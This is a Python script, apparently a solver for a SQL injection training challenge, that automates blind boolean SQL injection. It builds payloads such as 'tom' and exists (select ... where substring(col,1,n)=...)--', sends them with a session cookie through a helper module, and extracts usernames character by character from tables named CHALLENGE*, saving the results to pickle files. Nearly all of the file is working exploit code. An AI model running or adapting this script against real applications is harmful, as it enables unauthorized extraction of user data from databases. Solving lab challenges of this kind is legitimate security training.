from helpers import inject
import pickle
import tabulate
import string


def print_usernames() -> None:
    """
    Reads the usernames.pkl file and prints the output using tabulate

    :return: None
    """
    data = pickle.load(open('outputs/usernames.pkl', 'rb'))
    row = []

    for entry in data:
        for (table_name, column_name), usernames in entry.items():
            row.append([table_name, column_name, ','.join(usernames)])

    print(tabulate.tabulate(row, headers=["Table Name", "Column Name", "Usernames"]))


def check_query(column_name: str, table_name: str, user_id: str):
    """
    Returns a query string for SQL injection that is used to find the candidate names that are valid.

    :param column_name: Name of the column to search in for
    :param table_name: Name of the table to search in for
    :param user_id: User id  to look for
    :return: Query String
    """
    return (
        f'tom\' and exists (select {column_name} from {table_name} where '
        f'{column_name}=\'{user_id}\')--'
    )


def builder_query(column_name: str, table_name: str, length: int, word: str) -> str:
    """
    Returns a query string for SQL injection that is used to build the list of possible candidates.

    :param column_name: Name of the column to look in for
    :param table_name: Name of the table to search in for
    :param length: Length of the sequence
    :param word: Sequence of letters
    :return: Query String
    """
    return (
        f'tom\' and exists (select {column_name} from {table_name} where '
        f'substring({column_name},1, {length})=\'{word}\')--'
    )


def get_usernames(cookie: str) -> None:
    """
    Retrieves the usernames via backtracking from the USERID field from tables that
    have names starting with CHALLENGE.

    Saves the program state while iterating and the output as a list of
    dict<(table_name, column_name), list(username)>

    :param cookie: Session cookie required by the header
    :return: None
    """
    usernames = []
    keywords = ['USERID', 'USERNAME', 'USER_ID', 'USER_NAME', 'HANDLE']
    tables_columns = pickle.load(open('outputs/columns.pkl', 'rb'))
    alphabets = string.ascii_letters + string.digits + '_!@#$%^&*-+'
    no_of_queries = 0

    for table_column in tables_columns:
        table_name, columns = tuple(table_column.items())[0]
        if table_name.startswith('CHALLENGE'):
            for column in table_column[table_name]:
                program_state_usernames = []
                queue = ['']
                all_usernames = []
                username_dict = {(table_name, column): []}

                if column in keywords:
                    while queue:
                        queue_word = queue.pop(0)
                        for a in alphabets:
                            word = queue_word + a
                            query = builder_query(
                                column_name=column,
                                table_name=table_name,
                                length=len(word),
                                word=word,
                            )
                            no_of_queries += 1

                            if inject.inject(cookie=cookie, query=query):
                                print(
                                    f'Found Word: {word}, {len(word)} - Table: {table_name}'
                                )
                                all_usernames.append(word)
                                queue.append(word)

                        program_state_usernames.append([queue, all_usernames])
                        pickle.dump(
                            program_state_usernames,
                            open('states/program_state_usernames.pkl', 'wb'),
                        )

                    for name in all_usernames:
                        query = check_query(
                            column_name=column, table_name=table_name, user_id=name
                        )
                        no_of_queries += 1

                        if inject.check(cookie=cookie, query=query):
                            print(f'Found Username: {name}')
                            username_dict[(table_name, column)].append(name)
                    usernames.append(username_dict)
                    print(usernames)
                    pickle.dump(usernames, open('outputs/usernames.pkl', 'wb'))
                else:
                    print(
                        f'None of the keywords match for table name {table_name}. Please manually check for the username column name.'
                    )

    print(f'No of queries: {no_of_queries}')
